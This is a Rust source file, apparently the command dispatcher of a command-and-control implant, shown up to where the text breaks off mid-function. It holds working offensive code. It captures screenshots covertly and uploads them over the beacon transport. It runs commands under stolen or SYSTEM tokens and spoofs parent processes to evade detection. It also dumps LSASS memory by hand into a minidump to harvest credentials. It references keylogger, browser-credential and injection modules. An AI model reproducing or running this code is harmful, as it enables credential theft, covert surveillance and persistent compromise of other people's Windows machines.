/// Command dispatcher — full task parity with the Go/Nim agents.

// Declare sibling source files via explicit path so main.rs stays untouched.
// Rust resolves #[path] relative to the directory of the declaring file (src/).
#[cfg(target_os = "windows")]
#[path = "kerberos.rs"]
mod kerberos;
#[cfg(target_os = "windows")]
#[path = "pe_exec.rs"]
mod pe_exec;
#[cfg(target_os = "windows")]
#[path = "commands_injection.rs"]
mod commands_injection;
#[cfg(target_os = "windows")]
#[path = "commands_tokens.rs"]
mod commands_tokens;
#[cfg(target_os = "windows")]
#[path = "commands_defense.rs"]
mod commands_defense;
#[cfg(target_os = "windows")]
#[path = "commands_utils.rs"]
mod commands_utils;
#[path = "commands_ishell.rs"]
mod commands_ishell;
#[cfg(target_os = "windows")]
#[path = "keylog.rs"]
mod keylog;
#[path = "socks.rs"]
mod socks;
#[cfg(target_os = "windows")]
#[path = "browser_creds.rs"]
mod browser_creds;
#[cfg(target_os = "windows")]
#[path = "clipboard.rs"]
mod clipboard;
#[path = "rsocks.rs"]
mod rsocks;
#[path = "http_pivot.rs"]
mod http_pivot;
#[path = "tcp_pivot.rs"]
mod tcp_pivot;
#[cfg(target_os = "windows")]
#[path = "pipe_server.rs"]
mod pipe_server;

#[cfg(target_os = "windows")]
pub(crate) fn pipe_server_active() -> bool {
    pipe_server::is_active()
}

#[path = "portfwd.rs"]
mod portfwd;

use crate::config;
use std::sync::atomic::{AtomicBool, AtomicIsize, AtomicU64, Ordering};
use std::sync::{Arc, Mutex, OnceLock};
use std::collections::HashMap;
#[cfg(target_os = "windows")]
use std::collections::VecDeque;
use std::process::Command;
use base64::{engine::general_purpose::STANDARD, Engine as _};
use crate::transport::{AgentTransport, TaskWire};

// ── BOF in-process store ─────────────────────────────────────────────────────

static BOF_STORE: OnceLock<Arc<Mutex<HashMap<String, Vec<u8>>>>> = OnceLock::new();

fn bof_store_get_map() -> Arc<Mutex<HashMap<String, Vec<u8>>>> {
    BOF_STORE.get_or_init(|| Arc::new(Mutex::new(HashMap::new()))).clone()
}

fn bof_store_load(name: &str, data: Vec<u8>) -> String {
    let len = data.len();
    bof_store_get_map().lock().unwrap().insert(name.to_string(), data);
    format!("[+] BOF '{}' loaded into store ({} bytes)", name, len)
}

fn bof_store_get(name: &str) -> Option<Vec<u8>> {
    bof_store_get_map().lock().unwrap().get(name).cloned()
}

fn bof_store_list() -> String {
    let m = bof_store_get_map();
    let lock = m.lock().unwrap();
    if lock.is_empty() { return "(bof store empty)".to_string(); }
    let mut lines: Vec<String> = lock.iter()
        .map(|(k, v)| format!("  {:<30}  {} bytes", k, v.len()))
        .collect();
    lines.sort();
    lines.join("\n")
}

fn bof_store_unload(name: &str) -> String {
    let m = bof_store_get_map();
    let mut lock = m.lock().unwrap();
    if lock.remove(name).is_some() {
        format!("[+] BOF '{}' removed from store", name)
    } else {
        format!("[-] BOF '{}' not in store", name)
    }
}

pub static DYN_SLEEP_SEC:  AtomicU64 = AtomicU64::new(u64::MAX);
pub static DYN_JITTER_PCT: AtomicU64 = AtomicU64::new(u64::MAX);

fn shell_quote(s: &str) -> String {
    if cfg!(target_os = "windows") {
        format!("\"{}\"", s.replace('"', "\\\""))
    } else {
        format!("'{}'", s.replace('\'', "'\\''"))
    }
}

static DYN_WORKING_HOURS: OnceLock<Mutex<String>> = OnceLock::new();
fn dyn_working_hours() -> std::sync::MutexGuard<'static, String> {
    DYN_WORKING_HOURS.get_or_init(|| Mutex::new(String::new())).lock().unwrap()
}

// ── Screenwatch globals (Windows only) ───────────────────────────────────────

#[cfg(target_os = "windows")]
static SCREENWATCH_STOP: AtomicBool = AtomicBool::new(false);
#[cfg(target_os = "windows")]
static SCREENWATCH_HANDLE: OnceLock<Mutex<Option<std::thread::JoinHandle<()>>>> = OnceLock::new();
#[cfg(target_os = "windows")]
static SCREENWATCH_UPLOADS: OnceLock<Mutex<VecDeque<Vec<u8>>>> = OnceLock::new();

#[cfg(target_os = "windows")]
fn screenwatch_handle() -> std::sync::MutexGuard<'static, Option<std::thread::JoinHandle<()>>> {
    SCREENWATCH_HANDLE.get_or_init(|| Mutex::new(None)).lock().unwrap()
}

#[cfg(target_os = "windows")]
fn screenwatch_uploads() -> std::sync::MutexGuard<'static, VecDeque<Vec<u8>>> {
    SCREENWATCH_UPLOADS.get_or_init(|| Mutex::new(VecDeque::new())).lock().unwrap()
}

/// Flush frames captured by the watcher through the active transport. The
/// background thread cannot borrow AgentTransport safely, so the beacon thread
/// owns the actual upload and does not silently force HTTP.
#[cfg(target_os = "windows")]
pub fn drain_screenwatch_uploads(t: &mut AgentTransport) {
    loop {
        let png = screenwatch_uploads().pop_front();
        let Some(png) = png else { break; };
        if config::TRANSPORT == "dns" || config::TRANSPORT == "smb" {
            // These transports currently have no binary upload framing; do
            // not turn every captured frame into a synthetic task-0 error.
            continue;
        }
        t.upload_file(0, "screenwatch.png", &png);
    }
}

#[cfg(target_os = "windows")]
fn spawn_screenwatch_thread(interval_sec: u64) {
    SCREENWATCH_STOP.store(false, Ordering::Relaxed);
    let handle = std::thread::spawn(move || {
        let sc_ps = concat!(
            "Add-Type -AssemblyName System.Windows.Forms,System.Drawing;",
            "$bmp=[System.Drawing.Bitmap]::new([System.Windows.Forms.Screen]",
            "::PrimaryScreen.Bounds.Width,",
            "[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height);",
            "$gfx=[System.Drawing.Graphics]::FromImage($bmp);",
            "$gfx.CopyFromScreen(0,0,0,0,$bmp.Size);",
            "$ms=[System.IO.MemoryStream]::new();",
            "$bmp.Save($ms,'Png');",
            "[Convert]::ToBase64String($ms.ToArray())"
        );
        while !SCREENWATCH_STOP.load(Ordering::Relaxed) {
            if let Ok(o) = Command::new("powershell.exe")
                .args(["-NoP", "-NonI", "-W", "Hidden", "-C", sc_ps])
                .output()
            {
                if o.status.success() {
                    let b64 = String::from_utf8_lossy(&o.stdout).trim().to_string();
                    if let Ok(png) = STANDARD.decode(&b64) {
                        let mut uploads = screenwatch_uploads();
                        // Keep only the newest few frames if the transport is
                        // unavailable, avoiding an unbounded memory queue.
                        if uploads.len() >= 3 { uploads.pop_front(); }
                        uploads.push_back(png);
                    }
                }
            }
            // Sleep in small increments so STOP flag is checked frequently
            let mut slept_ms = 0u64;
            let limit_ms = interval_sec * 1000;
            while slept_ms < limit_ms && !SCREENWATCH_STOP.load(Ordering::Relaxed) {
                std::thread::sleep(std::time::Duration::from_millis(250));
                slept_ms += 250;
            }
        }
    });
    *screenwatch_handle() = Some(handle);
}

// ── Shell helpers ─────────────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
unsafe fn shell_as_system(cmd: &str, token: isize) -> String {
    fn to_wide(s: &str) -> Vec<u16> { s.encode_utf16().chain(std::iter::once(0)).collect() }

    // Redirect output via '>' in the command line instead of passing pipe
    // handles through STARTF_USESTDHANDLES.  CreateProcessWithTokenW goes
    // through seclogon which cannot duplicate pipe handles across session
    // boundaries, causing STATUS_DLL_INIT_FAILED in the child process.
    use std::sync::atomic::{AtomicU64, Ordering};
    static SEQ: AtomicU64 = AtomicU64::new(0);
    let uid = ((std::process::id() as u64) << 32) | SEQ.fetch_add(1, Ordering::Relaxed);
    let out_path = format!(r"C:\Windows\Temp\sbo{:016x}.tmp", uid);
    let shell_args = format!("/d /c {} > \"{}\" 2>&1", cmd, out_path);
    let mut wargs = to_wide(&shell_args);
    let mut wargs_as_user = to_wide(&shell_args);

    let mut self_tok = 0isize;
    if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &mut self_tok) != 0 {
        enable_priv(self_tok, "SeImpersonatePrivilege");
        enable_priv(self_tok, "SeIncreaseQuotaPrivilege");
        enable_priv(self_tok, "SeAssignPrimaryTokenPrivilege");
        CloseHandle(self_tok);
    }
    enable_priv_token(token, "SeImpersonatePrivilege");
    enable_priv_token(token, "SeIncreaseQuotaPrivilege");
    enable_priv_token(token, "SeAssignPrimaryTokenPrivilege");

    // No STARTF_USESTDHANDLES — the child writes its own output file.
    let mut si: STARTUPINFOW = std::mem::zeroed();
    si.cb          = std::mem::size_of::<STARTUPINFOW>() as u32;
    si.dwFlags     = 0x0000_0001; // STARTF_USESHOWWINDOW
    si.wShowWindow = 0; // SW_HIDE
    let mut pi: PROCESS_INFORMATION = std::mem::zeroed();

    let app = to_wide(r"C:\Windows\System32\cmd.exe");
    let cwd = to_wide(r"C:\Windows\System32");
    let mut proc_ok = CreateProcessWithTokenW(
        token, 0, app.as_ptr(), wargs.as_mut_ptr(), CREATE_NO_WINDOW,
        std::ptr::null(), cwd.as_ptr(), &si, &mut pi,
    );
    let mut with_token_err = if proc_ok != 0 { 0 } else { GetLastError() };
    let mut as_user_err = 0u32;
    let mut impersonate_err = 0u32;
    if proc_ok == 0 {
        proc_ok = CreateProcessAsUserW(
            token, app.as_ptr(), wargs_as_user.as_mut_ptr(),
            std::ptr::null(), std::ptr::null(), 0, CREATE_NO_WINDOW,
            std::ptr::null(), cwd.as_ptr(), &si, &mut pi,
        );
        if proc_ok == 0 { as_user_err = GetLastError(); }
    }
    if proc_ok == 0 {
        if ImpersonateLoggedOnUser(token) == 0 {
            impersonate_err = GetLastError();
        } else {
            let mut retry = to_wide(&shell_args);
            proc_ok = CreateProcessWithTokenW(
                token, 0, app.as_ptr(), retry.as_mut_ptr(), CREATE_NO_WINDOW,
                std::ptr::null(), cwd.as_ptr(), &si, &mut pi,
            );
            if proc_ok == 0 { with_token_err = GetLastError(); }
            RevertToSelf();
        }
    }
    if proc_ok == 0 {
        return format!("[error: SYSTEM shell launch; WithToken={}; AsUser={}; Impersonate={}]",
                       with_token_err, as_user_err, impersonate_err);
    }

    let wait_res = WaitForSingleObject(pi.hProcess, 60_000);
    let mut child_exit = 259u32;
    GetExitCodeProcess(pi.hProcess, &mut child_exit);
    if wait_res == WAIT_TIMEOUT {
        TerminateProcess(pi.hProcess, 1);
        child_exit = 1;
    }
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    let out = std::fs::read(&out_path).unwrap_or_default();
    let _ = std::fs::remove_file(&out_path);
    if out.is_empty() && child_exit != 0 {
        return format!("[error: SYSTEM shell capture empty; exit={}; WithToken={}; AsUser={}]",
                       child_exit, with_token_err, as_user_err);
    }
    String::from_utf8_lossy(&out).into_owned()
}

#[cfg(target_os = "windows")]
pub(crate) fn shell(cmd: &str) -> String {
    use std::io::Read;
    use std::sync::{Arc, Mutex};
    use std::process::Stdio;

    #[cfg(target_os = "windows")]
    {
        let sys_tok = G_SYSTEM_TOKEN.load(Ordering::Acquire);
        if sys_tok != 0 {
            return unsafe { shell_as_system(cmd, sys_tok) };
        }
        let stolen_tok = G_STOLEN_TOKEN.load(Ordering::Acquire);
        if stolen_tok != 0 {
            return unsafe { shell_as_system(cmd, stolen_tok) };
        }
    }

    let mut child = match Command::new("cmd.exe")
        .args(["/s", "/c", cmd])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
    {
        Ok(c)  => c,
        Err(e) => return format!("[error: {}]", e),
    };

    // Read stdout/stderr in background threads so we never block
    // waiting for grandchild processes that inherit the pipe handles.
    let acc: Arc<Mutex<Vec<u8>>> = Arc::new(Mutex::new(Vec::new()));
    let mut readers = Vec::new();
    if let Some(stdout) = child.stdout.take() {
        let out = acc.clone();
        readers.push(std::thread::spawn(move || {
            let mut buf = [0u8; 4096];
            let mut r = stdout;
            loop {
                match r.read(&mut buf) {
                    Ok(0) | Err(_) => break,
                    Ok(n) => out.lock().unwrap().extend_from_slice(&buf[..n]),
                }
            }
        }));
    }
    if let Some(stderr) = child.stderr.take() {
        let out = acc.clone();
        readers.push(std::thread::spawn(move || {
            let mut buf = [0u8; 4096];
            let mut r = stderr;
            loop {
                match r.read(&mut buf) {
                    Ok(0) | Err(_) => break,
                    Ok(n) => out.lock().unwrap().extend_from_slice(&buf[..n]),
                }
            }
        }));
    }

    // Wait for cmd.exe itself (not grandchildren) with a 60s deadline.
    let deadline = std::time::Instant::now() + std::time::Duration::from_secs(60);
    loop {
        match child.try_wait() {
            Ok(Some(_)) => break,
            Ok(None) => {
                if std::time::Instant::now() >= deadline {
                    let _ = child.kill();
                    break;
                }
                std::thread::sleep(std::time::Duration::from_millis(50));
            }
            Err(e) => return format!("[error: {}]", e),
        }
    }

    // Give reader threads a brief moment to flush then return.
    // They may still be blocking on grandchild handles — that's fine,
    // they are daemon threads and we don't join them.
    std::thread::sleep(std::time::Duration::from_millis(150));
    let bytes = acc.lock().unwrap().clone();
    String::from_utf8_lossy(&bytes).into_owned()
}

#[cfg(not(target_os = "windows"))]
fn shell(cmd: &str) -> String {
    match Command::new("sh").args(["-c", cmd]).output() {
        Ok(o) => {
            let mut out = String::from_utf8_lossy(&o.stdout).into_owned();
            let err = String::from_utf8_lossy(&o.stderr);
            if !err.is_empty() { out.push_str(&err); }
            out
        }
        Err(e) => format!("[error: {}]", e),
    }
}

#[cfg(target_os = "windows")]
unsafe fn shell_opsec(cmd: &str) -> String {
    // Find RuntimeBroker.exe, fall back to explorer.exe for PPID spoof.
    let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if snap == INVALID_HANDLE_VALUE { return shell(cmd); }
    let mut pe: PROCESSENTRY32 = std::mem::zeroed();
    pe.dwSize = std::mem::size_of::<PROCESSENTRY32>() as u32;
    let mut rb_pid = 0u32;
    let mut ex_pid = 0u32;
    if Process32First(snap, &mut pe) != 0 {
        loop {
            let end = pe.szExeFile.iter().position(|&b| b == 0).unwrap_or(pe.szExeFile.len());
            let name = String::from_utf8_lossy(&pe.szExeFile[..end]);
            if name.eq_ignore_ascii_case("RuntimeBroker.exe") { rb_pid = pe.th32ProcessID; break; }
            if ex_pid == 0 && name.eq_ignore_ascii_case("explorer.exe") { ex_pid = pe.th32ProcessID; }
            if Process32Next(snap, &mut pe) == 0 { break; }
        }
    }
    CloseHandle(snap);
    let parent_pid = if rb_pid != 0 { rb_pid } else { ex_pid };
    if parent_pid == 0 { return shell(cmd); }

    let hparent = OpenProcess(PROCESS_CREATE_PROCESS, 0, parent_pid);
    if hparent == 0 { return shell(cmd); }

    // Build temp output path.
    let pid = std::process::id();
    let tick: u32 = {
        use windows_sys::Win32::System::SystemInformation::GetTickCount;
        GetTickCount()
    };
    let out_path = format!("C:\\Windows\\Temp\\sbo{:08x}{:08x}.tmp", pid, tick);
    let cmdline = format!("cmd.exe /d /c {} > \"{}\" 2>&1\0", cmd, out_path);
    let mut cmdline_w: Vec<u16> = cmdline.encode_utf16().collect();

    let mut attr_size = 0usize;
    InitializeProcThreadAttributeList(std::ptr::null_mut(), 1, 0, &mut attr_size);
    let heap = GetProcessHeap();
    let attr_list = HeapAlloc(heap, 0, attr_size) as LPPROC_THREAD_ATTRIBUTE_LIST;
    if attr_list.is_null() { CloseHandle(hparent); return shell(cmd); }
    InitializeProcThreadAttributeList(attr_list, 1, 0, &mut attr_size);
    UpdateProcThreadAttribute(
        attr_list, 0,
        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS as usize,
        &hparent as *const isize as *const _,
        std::mem::size_of::<isize>(),
        std::ptr::null_mut(),
        std::ptr::null(),
    );

    let mut si: STARTUPINFOEXW = std::mem::zeroed();
    si.StartupInfo.cb = std::mem::size_of::<STARTUPINFOEXW>() as u32;
    si.lpAttributeList = attr_list;
    let mut pi: PROCESS_INFORMATION = std::mem::zeroed();
    let ok = CreateProcessW(
        std::ptr::null(), cmdline_w.as_mut_ptr(),
        std::ptr::null(), std::ptr::null(), 0,
        EXTENDED_STARTUPINFO_PRESENT | 0x08000000, // CREATE_NO_WINDOW
        std::ptr::null(), std::ptr::null(),
        &si.StartupInfo, &mut pi,
    );
    DeleteProcThreadAttributeList(attr_list);
    HeapFree(heap, 0, attr_list as *const _);
    CloseHandle(hparent);

    if ok == 0 { return shell(cmd); }

    WaitForSingleObject(pi.hProcess, 30000);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    let out = std::fs::read_to_string(&out_path).unwrap_or_else(|_| "[no output]".into());
    let _ = std::fs::remove_file(&out_path);
    out
}

#[cfg(not(target_os = "windows"))]
fn shell_opsec(cmd: &str) -> String { shell(cmd) }

#[cfg(target_os = "windows")]
fn ps(script: &str) -> String {
    match Command::new("powershell.exe")
        .args(["-NoP", "-NonI", "-W", "Hidden", "-C", script])
        .output()
    {
        Ok(o) => {
            let mut s = String::from_utf8_lossy(&o.stdout).into_owned();
            let e = String::from_utf8_lossy(&o.stderr);
            if !e.is_empty() { s.push_str(&e); }
            s
        }
        Err(e) => format!("[ps error: {}]", e),
    }
}

#[cfg(target_os = "windows")]
fn wide(s: &str) -> Vec<u16> {
    s.encode_utf16().chain([0u16]).collect()
}

// ── Native Windows helpers ────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
use windows_sys::Win32::Foundation::{
    CloseHandle, GetLastError, HANDLE, INVALID_HANDLE_VALUE, LUID, PAPCFUNC,
};
#[cfg(target_os = "windows")]
use windows_sys::Win32::System::Threading::{
    OpenProcess, CreateRemoteThread, OpenThread, GetCurrentProcess, QueueUserAPC,
    OpenProcessToken, CreateProcessW, ResumeThread,
    InitializeProcThreadAttributeList, UpdateProcThreadAttribute, DeleteProcThreadAttributeList,
    PROCESS_ALL_ACCESS, PROCESS_QUERY_INFORMATION, PROCESS_CREATE_PROCESS, THREAD_SET_CONTEXT,
    EXTENDED_STARTUPINFO_PRESENT, CREATE_SUSPENDED, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
    STARTUPINFOEXW, PROCESS_INFORMATION, LPPROC_THREAD_ATTRIBUTE_LIST,
};
#[cfg(target_os = "windows")]
use windows_sys::Win32::System::Memory::{
    VirtualAllocEx, VirtualProtectEx,
    GetProcessHeap, HeapAlloc, HeapFree,
    MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE,
};
#[cfg(target_os = "windows")]
use windows_sys::Win32::System::Diagnostics::Debug::{
    WriteProcessMemory, GetThreadContext, SetThreadContext,
    CONTEXT, CONTEXT_DEBUG_REGISTERS_AMD64,
};
#[cfg(target_os = "windows")]
use windows_sys::Win32::System::LibraryLoader::GetModuleHandleW;
#[cfg(target_os = "windows")]
use windows_sys::Win32::System::Memory::VirtualProtect;
#[cfg(target_os = "windows")]
use windows_sys::Win32::System::Diagnostics::ToolHelp::{
    CreateToolhelp32Snapshot, Thread32First, Thread32Next,
    Process32First, Process32Next,
    THREADENTRY32, PROCESSENTRY32, TH32CS_SNAPTHREAD, TH32CS_SNAPPROCESS,
};
#[cfg(target_os = "windows")]
use windows_sys::Win32::Security::{
    DuplicateTokenEx, ImpersonateLoggedOnUser, RevertToSelf,
    AdjustTokenPrivileges, LookupPrivilegeValueW,
    GetTokenInformation, SetTokenInformation,
    LogonUserW, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_WINNT50,
    SecurityDelegation, SecurityImpersonation, TokenImpersonation, TokenPrimary,
    TokenSessionId,
    TOKEN_ALL_ACCESS, TOKEN_DUPLICATE, TOKEN_QUERY, TOKEN_ADJUST_PRIVILEGES,
    SE_PRIVILEGE_ENABLED, TOKEN_PRIVILEGES, LUID_AND_ATTRIBUTES,
};
#[cfg(target_os = "windows")]
use windows_sys::Win32::System::Services::{
    OpenSCManagerW, CreateServiceW, StartServiceW, DeleteService, CloseServiceHandle,
    SC_MANAGER_ALL_ACCESS, SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
    SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
};
#[cfg(target_os = "windows")]
use windows_sys::Win32::Storage::FileSystem::{
    FILE_FLAG_OVERLAPPED, PIPE_ACCESS_DUPLEX,
};
#[cfg(target_os = "windows")]
use windows_sys::Win32::Security::SECURITY_ATTRIBUTES;
#[cfg(target_os = "windows")]
use windows_sys::Win32::System::Pipes::{
    ConnectNamedPipe, CreateNamedPipeW, ImpersonateNamedPipeClient, PIPE_TYPE_BYTE,
};
#[cfg(target_os = "windows")]
use windows_sys::Win32::System::IO::{CancelIoEx, OVERLAPPED};
#[cfg(target_os = "windows")]
use windows_sys::Win32::Foundation::{WAIT_OBJECT_0, WAIT_TIMEOUT};
#[cfg(target_os = "windows")]
use windows_sys::Win32::System::Threading::{
    CreateEventW, WaitForSingleObject, GetCurrentThreadId,
    GetExitCodeProcess, TerminateProcess, CreateProcessWithTokenW, OpenThreadToken, GetCurrentThread,
    STARTUPINFOW, CREATE_NO_WINDOW,
};
#[cfg(target_os = "windows")]
use windows_sys::Win32::Security::TOKEN_IMPERSONATE;


#[cfg(target_os = "windows")]
#[link(name = "advapi32")]
extern "system" {
    fn CreateProcessAsUserW(
        token: isize, app: *const u16, command: *mut u16,
        process_attrs: *const SECURITY_ATTRIBUTES, thread_attrs: *const SECURITY_ATTRIBUTES,
        inherit_handles: i32, flags: u32, environment: *const core::ffi::c_void,
        current_dir: *const u16, startup: *const STARTUPINFOW,
        process_info: *mut PROCESS_INFORMATION,
    ) -> i32;
}

// Primary SYSTEM token stored by get_system(); shell() uses it via
// direct token launch so commands run as SYSTEM on any dispatch thread.
#[cfg(target_os = "windows")]
static G_SYSTEM_TOKEN: AtomicIsize = AtomicIsize::new(0);

// Primary token from steal-token/make-token; used by shell() when G_SYSTEM_TOKEN is 0.
#[cfg(target_os = "windows")]
static G_STOLEN_TOKEN: AtomicIsize = AtomicIsize::new(0);

#[cfg(target_os = "windows")]
pub(crate) fn system_token_handle() -> isize {
    G_SYSTEM_TOKEN.load(Ordering::Acquire)
}

// ── LSASS_DUMP_NT ─────────────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
unsafe fn lsass_dump_nt(lsas_pid: u32) -> Vec<u8> {
    use windows_sys::Win32::System::Diagnostics::ToolHelp::{
        CreateToolhelp32Snapshot, Module32First, Module32Next, MODULEENTRY32, TH32CS_SNAPMODULE,
        Process32First, Process32Next, PROCESSENTRY32, TH32CS_SNAPPROCESS,
    };
    use windows_sys::Win32::System::Threading::PROCESS_VM_READ;
    use windows_sys::Win32::System::Memory::{VirtualQueryEx, MEMORY_BASIC_INFORMATION, MEM_COMMIT};
    use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
    use windows_sys::Win32::System::SystemInformation::OSVERSIONINFOW;

    let mut pid = lsas_pid;
    if pid == 0 {
        let snap0 = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if snap0 != -1 {
            let mut pe: PROCESSENTRY32 = std::mem::zeroed();
            pe.dwSize = std::mem::size_of::<PROCESSENTRY32>() as u32;
            if Process32First(snap0, &mut pe) != 0 {
                loop {
                    let name = pe.szExeFile.iter().take_while(|&&c| c != 0)
                        .map(|&c| (c as u8) as char).collect::<String>().to_lowercase();
                    if name == "lsass.exe" { pid = pe.th32ProcessID; break; }
                    if Process32Next(snap0, &mut pe) == 0 { break; }
                }
            }
            CloseHandle(snap0);
        }
    }
    if pid == 0 { return Vec::new(); }

    let hproc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, 0, pid);
    if hproc == 0 { return Vec::new(); }
    // RAII close via drop at end
    struct Handle(windows_sys::Win32::Foundation::HANDLE);
    impl Drop for Handle { fn drop(&mut self) { unsafe { CloseHandle(self.0); } } }
    let _hproc_guard = Handle(hproc);

    // NtReadVirtualMemory via GetProcAddress
    type NtReadVM = unsafe extern "system" fn(HANDLE: isize, Base: *const u8, Buf: *mut u8,
                                              Sz: usize, Nr: *mut usize) -> i32;
    let ntdll = GetModuleHandleA(b"ntdll.dll\0".as_ptr());
    if ntdll == 0 { return Vec::new(); }
    let nt_read_raw = GetProcAddress(ntdll, b"NtReadVirtualMemory\0".as_ptr());
    if nt_read_raw.is_none() { return Vec::new(); }
    let nt_read: NtReadVM = std::mem::transmute(nt_read_raw.unwrap());

    // detect real OS version via RtlGetVersion (bypasses compatibility shim)
    type RtlGetVersion_t = unsafe extern "system" fn(*mut OSVERSIONINFOW) -> i32;
    let mut osvi: OSVERSIONINFOW = std::mem::zeroed();
    osvi.dwOSVersionInfoSize = std::mem::size_of::<OSVERSIONINFOW>() as u32;
    if let Some(rtl) = GetProcAddress(ntdll, b"RtlGetVersion\0".as_ptr()) {
        let pfn: RtlGetVersion_t = std::mem::transmute(rtl);
        pfn(&mut osvi);
    }
    let os_major: u32 = if osvi.dwMajorVersion != 0 { osvi.dwMajorVersion } else { 10 };
    let os_minor: u32 = osvi.dwMinorVersion;
    let os_build: u32 = if osvi.dwBuildNumber  != 0 { osvi.dwBuildNumber  } else { 19041 };

    // Module enumeration
    struct ModInfo { base: u64, size: u32, name: Vec<u8> }
    let mut mods: Vec<ModInfo> = Vec::new();
    let snap1 = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid);
    if snap1 != -1 {
        let mut me: MODULEENTRY32 = std::mem::zeroed();
        me.dwSize = std::mem::size_of::<MODULEENTRY32>() as u32;
        if Module32First(snap1, &mut me) != 0 {
            loop {
                let name_bytes: Vec<u8> = me.szModule.iter().take_while(|&&c| c != 0)
                    .map(|&c| c as u8).collect();
                // UTF-16 LE encoding for MINIDUMP_STRING
                let mut utf16: Vec<u8> = Vec::new();
                for c in name_bytes.iter() { utf16.push(*c); utf16.push(0); }
                utf16.push(0); utf16.push(0); // null terminator
                mods.push(ModInfo { base: me.modBaseAddr as u64, size: me.modBaseSize, name: utf16 });
                if Module32Next(snap1, &mut me) == 0 { break; }
            }
        }
        CloseHandle(snap1);
    }

    // Memory enumeration via VirtualQueryEx + NtReadVirtualMemory
    struct MemReg { addr: u64, raw: Vec<u8> }
    let mut regs: Vec<MemReg> = Vec::new();
    let mut cur: usize = 0;
    loop {
        let mut mbi: MEMORY_BASIC_INFORMATION = std::mem::zeroed();
        let r = VirtualQueryEx(hproc, cur as *const _, &mut mbi, std::mem::size_of_val(&mbi));
        if r == 0 { break; }
        if mbi.State == MEM_COMMIT {
            let mut rbuf = vec![0u8; mbi.RegionSize];
            let mut n_read: usize = 0;
            nt_read(hproc, mbi.BaseAddress as *const u8,
                    rbuf.as_mut_ptr(), mbi.RegionSize, &mut n_read);
            if n_read > 0 {
                rbuf.truncate(n_read);
                regs.push(MemReg { addr: mbi.BaseAddress as u64, raw: rbuf });
            }
        }
        let next = mbi.BaseAddress as usize + mbi.RegionSize;
        if next <= cur { break; }
        cur = next;
    }

    // Build MDMP
    const MOD_ENT_SZ: usize = 108;
    const SYS_INFO_SZ: usize = 62; // 56 struct + 6 bytes empty MINIDUMP_STRING for CSDVersionRva
    const NUM_STREAMS: u32   = 3;

    let dir_off      = 32usize;
    let sys_info_off = dir_off + 3 * 12;           // 68
    let mod_list_off = sys_info_off + SYS_INFO_SZ; // 130
    let mod_entries_end = mod_list_off + 4 + mods.len() * MOD_ENT_SZ;

    // compute name blob offsets
    struct NameBlob { rva: usize, blob: Vec<u8> }
    let mut names: Vec<NameBlob> = Vec::new();
    let mut name_off = mod_entries_end;
    for m in &mods {
        // m.name is already UTF-16 LE with null; blob = ULONG32(len excl null) + UTF-16
        let char_len = m.name.len() - 2; // exclude null terminator bytes
        let mut blob = Vec::with_capacity(4 + m.name.len());
        blob.extend_from_slice(&(char_len as u32).to_le_bytes());
        blob.extend_from_slice(&m.name);
        names.push(NameBlob { rva: name_off, blob: blob.clone() });
        name_off += blob.len();
    }

    let mem64_off     = name_off;
    let mem64_hdr_len = 8 + 8 + regs.len() * 16;
    let data_off      = mem64_off + mem64_hdr_len;
    let total_data: usize = regs.iter().map(|r| r.raw.len()).sum();
    let total_len = data_off + total_data;

    let mut buf = vec![0u8; total_len];

    macro_rules! pu32 { ($off:expr, $v:expr) => { buf[$off..$off+4].copy_from_slice(&($v as u32).to_le_bytes()); } }
    macro_rules! pu64 { ($off:expr, $v:expr) => { buf[$off..$off+8].copy_from_slice(&($v as u64).to_le_bytes()); } }
    macro_rules! pu16 { ($off:expr, $v:expr) => { buf[$off..$off+2].copy_from_slice(&($v as u16).to_le_bytes()); } }

    // MINIDUMP_HEADER
    pu32!(0,  0x504d444du32);
    pu32!(4,  0x0000a793u32);
    pu32!(8,  NUM_STREAMS);
    pu32!(12, dir_off as u32);
    pu32!(20, std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH).unwrap_or_default().as_secs() as u32);
    pu64!(24, 2u64);

    // Directories
    pu32!(dir_off,     7u32); pu32!(dir_off+4,  SYS_INFO_SZ as u32); pu32!(dir_off+8,  sys_info_off as u32);
    pu32!(dir_off+12,  4u32); pu32!(dir_off+16, (mem64_off - mod_list_off) as u32); pu32!(dir_off+20, mod_list_off as u32);
    pu32!(dir_off+24,  9u32); pu32!(dir_off+28, mem64_hdr_len as u32); pu32!(dir_off+32, mem64_off as u32);

    // SystemInfo
    let s = sys_info_off;
    pu16!(s,    9u16);    // PROCESSOR_ARCHITECTURE_AMD64
    pu16!(s+2,  6u16);    // ProcessorLevel
    buf[s+6] = 1;          // NumberOfProcessors
    buf[s+7] = 1;          // ProductType
    pu32!(s+8,  os_major);  // MajorVersion
    pu32!(s+12, os_minor);  // MinorVersion
    pu32!(s+16, os_build);  // BuildNumber
    pu32!(s+20, 2u32);     // PlatformId
    // CSDVersionRva → 6-byte empty MINIDUMP_STRING after the 56-byte struct
    // (Length=0, null wchar — already zero from vec![0u8])
    pu32!(s+24, (sys_info_off + 56) as u32);

    // ModuleList
    pu32!(mod_list_off, mods.len() as u32);
    for (i, (m, nb)) in mods.iter().zip(names.iter()).enumerate() {
        let e = mod_list_off + 4 + i * MOD_ENT_SZ;
        pu64!(e,    m.base);
        pu32!(e+8,  m.size);
        pu32!(e+20, nb.rva as u32);
    }
    for nb in &names {
